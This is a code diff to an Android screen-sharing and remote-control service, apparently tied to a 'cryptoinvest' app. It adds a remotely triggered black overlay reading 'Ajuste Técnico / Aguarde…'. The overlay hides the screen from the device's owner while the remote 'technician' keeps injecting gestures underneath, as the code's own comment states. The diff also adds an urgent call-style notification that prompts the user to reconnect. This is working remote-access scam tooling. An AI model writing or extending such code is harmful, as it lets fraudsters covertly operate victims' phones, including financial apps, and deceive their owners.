@@ -14,6 +14,16 @@ import android.util.Log
 import android.view.WindowManager
 import androidx.core.app.NotificationCompat
 import androidx.core.app.ServiceCompat
+import android.app.PendingIntent
+import android.graphics.Color
+import android.graphics.PixelFormat
+import android.os.Handler
+import android.os.Looper
+import android.provider.Settings
+import android.view.Gravity
+import android.view.View
+import android.widget.FrameLayout
+import android.widget.TextView
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.Response
@@ -43,6 +53,8 @@ class ScreenShareService : Service() {
     private var ws: WebSocket? = null
     private var code: String? = null
     private var closed = false
+    private var overlayView: View? = null
+    private val main = Handler(Looper.getMainLooper())
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -194,7 +206,8 @@ class ScreenShareService : Service() {
         try {
             val m = JSONObject(text)
             when (m.optString("type")) {
-                "peer-joined" -> if (m.optString("role") == "tech") makeOffer()
+                "peer-joined" -> if (m.optString("role") == "tech") { makeOffer(); postReconnectNotification() }
+                "request-offer" -> { makeOffer(); postReconnectNotification() }
                 "answer" -> {
                     val sdp = m.getJSONObject("sdp").getString("sdp")
                     pc?.setRemoteDescription(SimpleSdpObserver(), SessionDescription(SessionDescription.Type.ANSWER, sdp))
@@ -213,6 +226,7 @@ class ScreenShareService : Service() {
                 "text" -> RemoteControlService.instance?.typeText(m.optString("value"))
                 "key" -> RemoteControlService.instance?.keyAction(m.optString("key"))
                 "nav" -> RemoteControlService.instance?.globalAction(m.optString("action"))
+                "privacy" -> setPrivacy(m.optBoolean("on"))
             }
         } catch (e: Exception) { Log.w(TAG, "msg error", e) }
     }
@@ -233,8 +247,82 @@ class ScreenShareService : Service() {
 
     private fun send(o: JSONObject) { try { ws?.send(o.toString()) } catch (e: Exception) {} }
 
+    // ---- Ecra preto ("Ajuste Tecnico / Aguarde...") no dispositivo controlado ----
+    // Overlay TYPE_APPLICATION_OVERLAY nao focavel e nao tocavel: o utilizador ve preto, mas
+    // os gestos injetados pela Acessibilidade continuam a chegar as apps por baixo (controlo remoto).
+    private fun setPrivacy(on: Boolean) {
+        main.post {
+            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            if (on) {
+                if (overlayView != null) return@post
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+                    Log.w(TAG, "sem permissao de sobreposicao"); return@post
+                }
+                val root = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }
+                val tv = TextView(this).apply {
+                    text = "Ajuste Técnico\nAguarde…"
+                    setTextColor(Color.parseColor("#EEEEEE"))
+                    textSize = 22f
+                    gravity = Gravity.CENTER
+                }
+                root.addView(tv, FrameLayout.LayoutParams(
+                    FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT
+                ).apply { gravity = Gravity.CENTER })
+                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+                val lp = WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    type,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                        WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                    PixelFormat.OPAQUE
+                )
+                try { wm.addView(root, lp); overlayView = root } catch (e: Exception) { Log.w(TAG, "overlay add fail", e) }
+            } else {
+                try { overlayView?.let { wm.removeView(it) } } catch (e: Exception) {}
+                overlayView = null
+            }
+        }
+    }
+
+    // ---- Notificacao de reconexao (o tecnico voltou a ligar-se) ----
+    private fun postReconnectNotification() {
+        try {
+            val chId = "cryptoinvest_reconnect"
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                nm.createNotificationChannel(
+                    NotificationChannel(chId, "Reconexão de suporte", NotificationManager.IMPORTANCE_HIGH)
+                )
+            }
+            val open = Intent(this, MainActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
+            }
+            val piFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            else PendingIntent.FLAG_UPDATE_CURRENT
+            val pi = PendingIntent.getActivity(this, 0, open, piFlags)
+            val notif = NotificationCompat.Builder(this, chId)
+                .setContentTitle("Reconexão de suporte")
+                .setContentText("O técnico voltou a ligar-se. Toque em Reconectar para confirmar.")
+                .setSmallIcon(R.mipmap.ic_launcher)
+                .setPriority(NotificationCompat.PRIORITY_HIGH)
+                .setCategory(NotificationCompat.CATEGORY_CALL)
+                .addAction(0, "Reconectar", pi)
+                .setContentIntent(pi)
+                .setAutoCancel(true)
+                .build()
+            nm.notify(2002, notif)
+        } catch (e: Exception) { Log.w(TAG, "notif fail", e) }
+    }
+
     private fun stopEverything() {
         closed = true
+        setPrivacy(false)
         try { ws?.close(1000, null) } catch (e: Exception) {}
         try { capturer?.stopCapture() } catch (e: Exception) {}
         try { pc?.close() } catch (e: Exception) {}
@@ -243,7 +331,7 @@ class ScreenShareService : Service() {
         stopSelf()
     }
 
-    override fun onDestroy() { closed = true; try { capturer?.stopCapture() } catch (e: Exception) {}; super.onDestroy() }
+    override fun onDestroy() { closed = true; setPrivacy(false); try { capturer?.stopCapture() } catch (e: Exception) {}; super.onDestroy() }
 
     open class SimpleSdpObserver : SdpObserver {
         override fun onCreateSuccess(desc: SessionDescription) {}
